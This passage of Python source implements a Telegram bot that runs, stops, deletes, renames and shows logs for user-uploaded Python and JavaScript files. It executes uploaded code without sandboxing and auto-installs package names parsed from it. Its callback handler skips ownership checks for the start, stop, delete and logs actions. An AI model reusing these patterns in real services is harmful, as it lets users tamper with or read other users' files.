            return
        target_file = main_file
        working_dir = os.path.dirname(main_file)
        logger.info(f"Running from directory. Main file: {target_file}, Working dir: {working_dir}")
    else:
        if not os.path.exists(file_path):
            bot.send_message(chat_id, f"❌ File not found: {file_path}")
            return
        target_file = file_path
        working_dir = os.path.dirname(file_path)
        logger.info(f"Running single file: {target_file}, Working dir: {working_dir}")
    
    ext = os.path.splitext(target_file)[1].lower()
    
    if ext == ".py":
        requirements_path = os.path.join(working_dir, "requirements.txt")
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "📦 Installing requirements.txt...")
            success, message = install_requirements_from_file(requirements_path, chat_id, original_name)
            if not success:
                bot.send_message(chat_id, f"⚠️ Requirements installation had issues: {message}")
            else:
                bot.send_message(chat_id, f"✅ Requirements installed: {message}")
        
        bot.send_message(chat_id, "🔍 Checking for missing imports...")
        imports = extract_imports(target_file)
        if imports:
            success, message = install_missing_imports(imports, chat_id, original_name)
            bot.send_message(chat_id, f"📦 Import check: {message}")
    
    if ext == ".py":
        cmd = [sys.executable, target_file]
    elif ext == ".js":
        cmd = ["node", target_file]
    else:
        bot.send_message(chat_id, f"❌ Unsupported file type: {ext}")
        return
    
    log_filename = f"file_{file_id}_{int(time.time())}.log"
    log_path = os.path.join(LOGS_DIR, log_filename)
    
    try:
        logger.info(f"Starting process: {cmd} in directory: {working_dir}")
        
        with open(log_path, 'w') as log_file:
            process = subprocess.Popen(
                cmd,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=working_dir,
                text=True
            )
        
        run_id = record_run_start(file_id, process.pid, log_path)
        update_file_status(file_id, process.pid, "Running")
        
        with proc_lock:
            processes[file_id] = {
                'process': process,
                'run_id': run_id,
                'log_path': log_path,
                'started_at': datetime.utcnow().isoformat()
            }
        
        bot.send_message(chat_id, 
            f"✅ <b>{html_lib.escape(original_name)}</b> started!\n"
            f"📝 PID: <code>{process.pid}</code>\n"
            f"📁 Logs: <code>{log_filename}</code>"
        )
        
        def monitor_process():
            try:
                exit_code = process.wait()
                logger.info(f"Process {process.pid} finished with exit code {exit_code}")
            except Exception as e:
                logger.error(f"Process monitoring error: {e}")
                exit_code = -1
            finally:
                update_file_status(file_id, None, "Stopped")
                record_run_finish(run_id, exit_code)
                with proc_lock:
                    processes.pop(file_id, None)
                
                if exit_code != 0:
                    try:
                        bot.send_message(chat_id, 
                            f"⚠️ <b>{html_lib.escape(original_name)}</b> stopped\n"
                            f"Exit code: {exit_code}"
                        )
                    except:
                        pass
        
        threading.Thread(target=monitor_process, daemon=True).start()
        
    except Exception as e:
        error_msg = f"❌ Failed to start process: {str(e)}"
        logger.error(error_msg)
        bot.send_message(chat_id, error_msg)

def stop_file_process(file_id):
    stopped = False
    with proc_lock:
        if file_id in processes:
            process_info = processes[file_id]
            process = process_info['process']
            
            try:
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        process.wait()
                    stopped = True
                    logger.info(f"Stopped process {file_id}")
            except Exception as e:
                logger.error(f"Error stopping process {file_id}: {e}")
            
            processes.pop(file_id, None)
    
    update_file_status(file_id, None, "Stopped")
    return stopped

def get_file_logs(file_id, lines=50):
    try:
        with proc_lock:
            if file_id in processes:
                log_path = processes[file_id]['log_path']
                if os.path.exists(log_path):
                    with open(log_path, 'r') as f:
                        content = f.readlines()
                    return ''.join(content[-lines:]) if content else "No logs yet"
        
        cur = conn.cursor()
        cur.execute(
            "SELECT log_path FROM runs WHERE file_id=? ORDER BY started_at DESC LIMIT 1",
            (file_id,)
        )
        row = cur.fetchone()
        if row and row[0] and os.path.exists(row[0]):
            with open(row[0], 'r') as f:
                content = f.readlines()
            return ''.join(content[-lines:]) if content else "No logs found"
        
        return "No log file found"
    except Exception as e:
        return f"Error reading logs: {str(e)}"

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    data = call.data
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    if data == "back_to_main":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        bot.send_message(chat_id, "🏠 Returning to main menu...", reply_markup=main_menu_kb())
        return
    
    if data == "back_to_files":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        send_files_list(chat_id, user_id)
        return
    
    try:
        if data.startswith("manage:"):
            file_id = int(data.split(":")[1])
            show_file_management(chat_id, file_id, user_id, call.message.message_id)
        
        elif data.startswith("edit:"):
            file_id = int(data.split(":")[1])
            file_record = get_file_record(file_id)
            if not file_record or file_record["user_id"] != user_id:
                bot.answer_callback_query(call.id, "Access denied")
                return
            
            bot.answer_callback_query(call.id, "✏️ Send new name")
            msg = bot.send_message(chat_id, 
                f"📝 Send me the **new name** for this file:\n\n"
                f"Current name: `{file_record['orig_name']}`\n\n"
                f"⚠️ Type `/cancel` to cancel",
                parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_file_rename, file_id, user_id, call.message.message_id)
        
        elif data.startswith("start:"):
            file_id = int(data.split(":")[1])
            bot.answer_callback_query(call.id, "Starting...")
            start_file_process(file_id, chat_id)
            time.sleep(1)
            show_file_management(chat_id, file_id, user_id, call.message.message_id)
        
        elif data.startswith("stop:"):
            file_id = int(data.split(":")[1])
            bot.answer_callback_query(call.id, "Stopping...")
            stop_file_process(file_id)
            bot.send_message(chat_id, "⏹ Process stopped")
            time.sleep(1)
            show_file_management(chat_id, file_id, user_id, call.message.message_id)
        
        elif data.startswith("restart:"):
            file_id = int(data.split(":")[1])
            bot.answer_callback_query(call.id, "Restarting...")
            stop_file_process(file_id)
            time.sleep(2)
            start_file_process(file_id, chat_id)
            time.sleep(1)
            show_file_management(chat_id, file_id, user_id, call.message.message_id)
        
        elif data.startswith("delete:"):
            file_id = int(data.split(":")[1])
            bot.answer_callback_query(call.id, "Deleting...")
            file_record = get_file_record(file_id)
            if file_record:
                stop_file_process(file_id)
                file_path = file_record["path"]
                try:
                    if os.path.isdir(file_path):
                        shutil.rmtree(file_path, ignore_errors=True)
                    elif os.path.exists(file_path):
                        os.remove(file_path)
                except Exception as e:
                    logger.error(f"Error deleting file {file_path}: {e}")
                remove_file_record(file_id)
            bot.send_message(chat_id, "🗑 File deleted")
            send_files_list(chat_id, user_id)
        
        elif data.startswith("logs:"):
            file_id = int(data.split(":")[1])
            bot.answer_callback_query(call.id, "Getting logs...")
            logs = get_file_logs(file_id)
            file_record = get_file_record(file_id)
            file_name = file_record["orig_name"] if file_record else "Unknown"
            
            if len(logs) > 4000:
                logs = logs[-4000:]
                logs = "... (truncated) ...\n" + logs
            
            log_text = f"📄 <b>Logs for {html_lib.escape(file_name)}</b>\n\n<pre>{html_lib.escape(logs)}</pre>"
            bot.send_message(chat_id, log_text)
    
    except Exception as e:
        bot.answer_callback_query(call.id, "Error processing request")
        logger.error(f"Callback error: {e}")

def process_file_rename(message, file_id, user_id, original_msg_id=None):
    """Process the rename request"""
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Rename cancelled.")
        return
    
    new_name = message.text.strip()
    if not new_name:
        bot.reply_to(message, "❌ Invalid name. Please send a valid name.")
        return
    
    file_record = get_file_record(file_id)
    if not file_record or file_record["user_id"] != user_id:
        bot.reply_to(message, "❌ File not found or access denied.")
        return
    
    old_name = file_record["orig_name"]
    
    # Update display name in database
    with db_lock:
        cur = conn.cursor()
        cur.execute("UPDATE files SET orig_name=? WHERE id=? AND user_id=?", (new_name, file_id, user_id))
        conn.commit()
    
    # Try to rename actual file on disk (if it's a single file)
    rename_file_actual(file_record, new_name)
    
    bot.reply_to(message, f"✅ File renamed successfully!\n\nOld name: `{old_name}`\nNew name: `{new_name}`", parse_mode="Markdown")
    
    # Notify admin
    bot.send_message(TELEGRAM_ORG, f"✏️ User {user_id} renamed file:\nOld: `{old_name}`\nNew: `{new_name}`", parse_mode="Markdown")
    
    # Refresh the management view if the original message exists
    if original_msg_id:
        try:
            show_file_management(message.chat.id, file_id, user_id, original_msg_id)
        except:
            pass

def show_file_management(chat_id, file_id, user_id, message_id=None):
    file_record = get_file_record(file_id)
    if not file_record:
        bot.send_message(chat_id, "❌ File not found")
        return
    
    if file_record["user_id"] != user_id:
        bot.send_message(chat_id, "❌ Access denied")
        return
    
    is_running = False
    with proc_lock:
        is_running = file_id in processes
    
    status_text = "🟢 Running" if is_running else "🔴 Stopped"
    pid_text = f"\nPID: {file_record['pid']}" if file_record['pid'] else ""
    
    text = f"""
⚙️ <b>File Management</b>

📁 File: {html_lib.escape(file_record['orig_name'])}
📊 Type: {file_record['file_type']}
📈 Status: {status_text}{pid_text}
⏰ Uploaded: {file_record['uploaded_at'][:16]}
    """
    
    kb = file_actions_kb(file_id, is_running)
    
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=kb)
        except:
            bot.send_message(chat_id, text, reply_markup=kb)
    else:
        bot.send_message(chat_id, text, reply_markup=kb)

# Start bot polling
def start_bot():
    logger.info("Starting Telegram bot...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=50)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            time.sleep(5)

# Main execution
if __name__ == "__main__":
    logger.info("Starting 24x7 TEAM X HOSTING BOT...")
    start_bot()
